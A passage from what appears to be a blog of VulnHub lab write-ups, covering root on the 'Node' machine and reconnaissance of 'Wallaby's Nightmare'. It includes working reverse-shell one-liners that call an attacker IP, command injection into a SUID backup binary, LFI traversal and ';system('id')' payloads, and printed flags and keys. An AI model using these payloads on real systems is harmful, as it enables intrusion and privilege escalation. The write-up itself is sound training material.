MongoDB shell version: 3.2.16 connecting to: scheduler &amp;gt; show collections tasks Create reverse shell payload mark@node:/tmp$ printf &#39;#!/bin/bash\\n\\n /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.110.4/4444 0&amp;gt;&amp;amp;1\\n&#39; &amp;gt; exploit; chmod 4777 exploit; Add value into cmd from task collection that will execute our reverse shell payload we just created db.tasks.insert( {_id: 0, cmd: &quot;/tmp/exploit&quot;} ) WriteResult({ &quot;nInserted&quot; : 1 }) Successfully privilege escalate to Tom User Flag tom@node:~$ cat user.txt cat user.txt e1156acc3574e04b06908ecf76be91b1 tom@node:~$ Root - Via SUID Binary + Insecure Application Enumerate SUID files tom@node:~$ find / -perm -4000 2&amp;gt;/dev/null /usr/lib/eject/dmcrypt-get-device /usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/local/bin/backup /usr/bin/chfn /usr/bin/at /usr/bin/gpasswd /usr/bin/newgidmap /usr/bin/chsh /usr/bin/sudo /usr/bin/pkexec /usr/bin/newgrp /usr/bin/passwd /usr/bin/newuidmap /tmp/tombash /tmp/exploit /bin/ping /bin/umount /bin/fusermount /bin/ping6 /bin/ntfs-3g /bin/su /bin/mount /usr/local/bin/backup View contents of tom@node:/tmp$ strings /usr/local/bin/backup /lib/ld-linux.so.2 libc.so.6 _IO_stdin_used setuid strcpy exit sprintf srand fopen strncpy puts time clock getpid fgets strstr strcspn fclose strcat remove system geteuid strchr access strcmp __libc_start_main __gmon_start__ GLIBC_2.1 GLIBC_2.0 PTRh WVSQ Y[^_] UWVS t$,U [^_] [37m [33m %s[!]%s %s [32m %s[+]%s %s %s[+]%s Starting archiving %s ____________________________________________________ / \\ | _____________________________________________ | | | | | | | Secure Backup v1.0 | | | |_____________________________________________| | | | \\_____________________________________________________/ \\_______________________________________/ _______________________________________________ _-&#39; .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-. --- `-_ _-&#39;.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--. .-.-.`-_ _-&#39;.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_ _-&#39;.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_ _-&#39;.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_ :-----------------------------------------------------------------------------: `---._.-----------------------------------------------------------------._.---&#39; Could not open file Validated access token Ah-ah-ah! You didn&#39;t say the magic word! Finished! Encoded backup is below: UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA== /root /etc /tmp/.backup_%i /usr/bin/zip -r -P magicword %s %s &amp;gt; /dev/null /usr/bin/base64 -w0 %s The target path doesn&#39;t exist ;*2$&quot; GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609 crtstuff.c __JCR_LIST__ deregister_tm_clones __do_global_dtors_aux completed.7200 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry backup.c __FRAME_END__ __JCR_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini strstr@@GLIBC_2.0 strcmp@@GLIBC_2.0 _ITM_deregisterTMCloneTable __x86.get_pc_thunk.bx strcspn@@GLIBC_2.0 fgets@@GLIBC_2.0 _edata fclose@@GLIBC_2.1 time@@GLIBC_2.0 geteuid@@GLIBC_2.0 strcat@@GLIBC_2.0 strcpy@@GLIBC_2.0 getpid@@GLIBC_2.0 __data_start puts@@GLIBC_2.0 system@@GLIBC_2.0 clock@@GLIBC_2.0 __gmon_start__ exit@@GLIBC_2.0 __dso_handle displaySuccess _IO_stdin_used srand@@GLIBC_2.0 strchr@@GLIBC_2.0 __libc_start_main@@GLIBC_2.0 displayWarning displayTarget __libc_csu_init fopen@@GLIBC_2.1 strncpy@@GLIBC_2.0 _fp_hw access@@GLIBC_2.0 __bss_start main setuid@@GLIBC_2.0 _Jv_RegisterClasses sprintf@@GLIBC_2.0 remove@@GLIBC_2.0 __TMC_END__ _ITM_registerTMCloneTable .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .jcr .dynamic .got.plt .data .bss .comment There is a base64 encoded backup /usr/bin/zip -r -P magicword %s %s &amp;gt; /dev/null Directory we specified will be zipped with password magicword Earlier, app.js revealed Mark’s credentials, it also contains information about the binary backup -q &amp;lt;backup_key&amp;gt; &amp;lt;directory name to backup&amp;gt; Backup /etc/ tom@node:/tmp$ backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /etc/ [+] Finished! Encoded backup is below: UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA== Decode &amp;amp; unzip ┌──(root💀kali)-[~/vulnHub/Node-1/192.168.110.40/loot] └─# 7z e decoded.zip ┌──(root💀kali)-[~/vulnHub/Node-1/192.168.110.40/loot] └─# cat root.txt QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____. -~&quot;&quot;??9VWQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQP&#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,&quot;?9$QQQQQQQQQQQQQQ QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ QQQQQQQQQQW&#39; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ QQQQQQQP&#39;.yQQQQQQQQQQQP&quot; &amp;lt;wa,.!4WQQQQQQQWdWP??!&quot;??4WWQQQWQQc ?QWQQQQQ QQQQQP&#39;_a.&amp;lt;aamQQQW!&amp;lt;yF &quot;!` .. &quot;??$Qa &quot;WQQQWTVP&#39; &quot;??&#39; =QQmWWV?46/ ?QQQQQ QQQP&#39;sdyWQP?!`.-&quot;?46mQQQQQQT!mQQgaa. &amp;lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ QQ[ j@mQP&#39;adQQP4ga, -????&quot; &amp;lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?&quot;` -?QzQ7L ]QQQ QW jQkQ@ jWQQD&#39;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc &quot;4QQQQa .QP4QQQQfWkl jQQQ QE ]QkQk $D?` waa &quot;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`&quot;QQQD\\Qf(.QWQQ QQ,-Qm4Q/-QmQ6 &quot;WWQma/ &quot;??QQQQQQL 4W&quot;- -?$QQQQWP`s,awT$QQQ@ &quot;QW@?$:.yQQQQ QQm/-4wTQgQWQQ, ?4WWk 4waac -???$waQQQQQQQQF??&#39;&amp;lt;mWWWWWQW?^ ` ]6QQ&#39; yQQQQQ QQQQw,-?QmWQQQQw a, ?QWWQQQw _. &quot;????9VWaamQWV???&quot; a j/ ]QQf jQQQQQQ QQQQQQw,&quot;4QQQQQQm,-$Qa ???4F jQQQQQwc &amp;lt;aaas _aaaaa 4QW ]E )WQ`=QQQQQQQ QQQQQQWQ/ $QQQQQQQa ?H ]Wwa, ???9WWWh dQWWW,=QWWU? ?! )WQ ]QQQQQQQ QQQQQQQQQc-QWQQQQQW6, QWQWQQQk &amp;lt;c jWQ ]QQQQQQQ QQQQQQQQQQ,&quot;$WQQWQQQQg,.&quot;?QQQQ&#39;.mQQQmaa,., . .; QWQ.]QQQQQQQ QQQQQQQQQWQa ?$WQQWQQQQQa,.&quot;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ QQQQQQQQQQWWma &quot;9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ QQQQQQQQQQQQQQQws &quot;Tqau?9maZ?WQmaas,, --~-- --- . _ssawmQQQQQQk 3QQQQWQ QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}&amp;lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ QQQQQQQQQQQQQQQQQQQQQQWWQQga,-&quot;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,. -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^&quot;!???????!^`_saQWWQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ /etc/ &amp;amp; /root is hardcoded into displaying this troll face Unsure of how to do command injection, had to look at a writeup The exploit will not work in a pseudo terminal, execute a reverse shell to obtain another shell that is not a pseudo terminal rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.110.4 4242 &amp;gt;/tmp/f ┌──(root💀kali)-[~/vulnHub/Node-1] └─# nc -nvlp 4242 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4242 Ncat: Listening on 0.0.0.0:4242 Ncat: Connection from 192.168.110.40. Ncat: Connection from 192.168.110.40:57888. /bin/sh: 0: can&#39;t access tty; job control turned off $ Command Injection $ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &quot;$(echo &#39;/test_dir\\n\\n/bin/bash\\nls&#39;)&quot; Reference Explanation Presumably, the binary is using string interpolation to build up a shell command to run. We can use this to our advantage by using command injection. Given we cannot change the output being redirected to /dev/null and given the script will still want to zip up a folder, we will need to pass in a string as the third parameter to the binary executable with multiple \\n characters printed to bring about new lines. Then, when /bin/bash is executed we will have root access as the binary runs as root.We add the final command ls so that output our bash session is not redirected to /dev/null. Root Flag cd /root ls root.txt cat root.txt 1722e99ca5f353b362556a62bd5e6be0 Thoughts: Initial foothold is easy/medium, The privilege escalation is quite challenging " }, { "title": "Vulnhub - Wallaby&#39;s Nightmare", "url": "/posts/Wallaby's-Nightmare/", "categories": "Vulnhub, Linux", "tags": "exploit/command-injection, linux-priv-esc/sudo/gtfo-bin", "date": "2022-03-12 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Sat Mar 12 16:01:17 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Wallaby_Nightmare/192.168.110.39/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Wallaby_Nightmare/192.168.110.39/scans/xml/_full_tcp_nmap.xml 192.168.110.39Nmap scan report for 192.168.110.39Host is up, received arp-response (0.00050s latency).Scanned at 2022-03-12 16:01:17 +08 for 19sNot shown: 65532 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 6e:07:fc:70:20:98:f8:46:e4:8d:2e:ca:39:22:c7:be (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRXjkewNllkNLo46qiVKISIdysX+C//dfiL0yrAphV9jJg7ETXmLIcfKGQIuRVWXRPm5LgX1OE4LP4wmc5qWbCrI9HOZNMDDuZZsJ7hsHhDPVfu9J0aGoj69vPo7FCZlNWd+371cUiI0qmUeOGZGfAmZotGPkW9r6lom2ww6JphrtwpmlyI+pQk2x1qZR4ZnCIl+XmgFyGHEhim5ALMplxQP8qjnxjncr90xYSByjtQjlvURlemFjjbvVpPhX+BzsMAsXO16ywClLoig0dU39sSBbCSkgmryJYyLfkSWVO9KV6HPEXrVVxnHmUPwi19xGBiq9mxUbmPIza9r0BEofl| 256 99:46:05:e7:c2:ba:ce:06:c4:47:c8:4f:9f:58:4c:86 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE91a97Hjo/onlxZBy2uFVZ5oTYZcVW2ivqzxdbF0EANVVX5asJJWv3jnb0NQuZY0LqUEs3cObmDVrKETtWmDfw=| 256 4c:87:71:4f:af:1b:7c:35:49:ba:58:26:c1:df:b8:4f (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFgAepyDFEj6/qo0tkmqI6j2gL90Fft5eg4tKHe4YgH76667/tcp filtered irc no-response60080/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))|_http-title: Wallaby&#39;s Server| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)MAC Address: 08:00:27:80:57:12 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=3/12%OT=22%CT=1%CU=31449%PV=Y%DS=1%DC=D%G=Y%M=080027%TOS:M=622C5360%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II=IOS:%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%OOS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=OOS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=OS:N%T=40%CD=S)Uptime guess: 0.023 days (since Sat Mar 12 15:28:56 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=261 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.50 ms 192.168.110.39Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Mar 12 16:01:36 2022 -- 1 IP address (1 host up) scanned in 20.06 secondsTCP/60080 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]└─# ffuf -u http://$ip:60080/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.cgi,.log&#39; -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.39:60080/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .cgi .log :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403________________________________________________ [Status: 200, Size: 1147, Words: 220, Lines: 31]index.php [Status: 200, Size: 1147, Words: 220, Lines: 31]javascript [Status: 301, Size: 330, Words: 20, Lines: 10]:: Progress: [27690/27690] :: Job [1/1] :: 7261 req/sec :: Duration: [0:00:05] :: Errors: 0 :: javascriptNikto┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]└─# nikto -ask=no -h http://192.168.110.39:60080 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Wallaby_Nightmare/192.168.110.39/scans/tcp60080/tcp_60080_http_nikto.txt&quot;- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.110.39+ Target Hostname: 192.168.110.39+ Target Port: 60080+ Start Time: 2022-03-12 16:08:13 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.18 (Ubuntu)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)+ OSVDB-3233: /icons/README: Apache default file found.+ 7917 requests: 0 error(s) and 7 item(s) reported on remote host+ End Time: 2022-03-12 16:09:12 (GMT8) (59 seconds)---------------------------------------------------------------------------+ 1 host(s) tested LFI Vulnerability Found: /index.php?page=../../../../../../../../../../etc/passwd Initial FootholdTCP/60080 (HTTP) - Enumerate URL parameter against LFI wordlist Check if LFI Vulnerability really exists A rabbit hole? Enumerate URL parameter against a LFI wordlist ┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare] └─# ffuf -u http://$ip:60080/index.php?page=../../../../..FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt -fs 900 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.39:60080/index.php?page=../../../../..FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/LFI/file_inclusion_linux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 900 ________________________________________________ Only /etc/passwd is enumerated Use php://filter/convert.base64-encode/resource to view the source code Could not include SSH log files, Apache log filesTCP/60080 (HTTP) - Enumerate URL parameter against a command injection wordlist Enumerate URL parameter against a command injection wordlist ┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare] └─# ffuf -u http://$ip:60080/index.php?page=FUZZ -w /usr/share/wordlists/command_injection/commandInjectionLinux.txt -fw 182,181,199 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.39:60080/index.php?page=FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/command_injection/commandInjectionLinux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 182,181,199 ________________________________________________ ;system(&#39;id&#39;) [Status: 200, Size: 1743, Words: 315, Lines: 39] system(&#39;cat /etc/passwd&#39;); [Status: 200, Size: 1743, Words: 315, Lines: 39] :: Progress: [102/102] :: Job [1/1] :: 65 req/sec :: Duration: [0:00:02] :: Errors: 0 :: # Word count 181 - Nice try ghz&amp;gt;hzx buddy, this vector is patched! # Word count 182 - Dude, ghz&amp;gt;hzx what are you trying over here?! # Word count 199 - /etc/passwd ;system(&#39;id&#39;), new output View ;system(&#39;id&#39;) output - /?page=blacklist View /?page=blacklist TCP/60080 (HTTP) - Enumerate URL parameter against a regular wordlist FUZZ URL parameter against common.txt ┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare] └─# ffuf -u http://$ip:60080/index.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -fw 182,181 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.39:60080/index.php?page=FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 182,181 ________________________________________________ home [Status: 200, Size: 1148, Words: 220, Lines: 31] index [Status: 200, Size: 1363, Words: 279, Lines: 39] mailer [Status: 200, Size: 1086, Words: 204, Lines: 30] :: Progress: [4615/4615] :: Job [1/1] :: 7324 req/sec :: Duration: [0:00:04] :: Errors: 0 :: View enumerated directories index home mail Interesting comment found on the page source /?page=mailer&amp;amp;mail=mail There is a second URL parameter mail TCP/60080 (HTTP) - Enumerate 2nd URL Parameter + RCE FUZZ mail parameter against command injection wordlist ┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare] └─# ffuf -u &quot;http://192.168.110.39:60080/?page=mailer&amp;amp;mail=FUZZ&quot; -w /usr/share/wordlists/command_injection/commandInjectionLinux.txt -fw 204 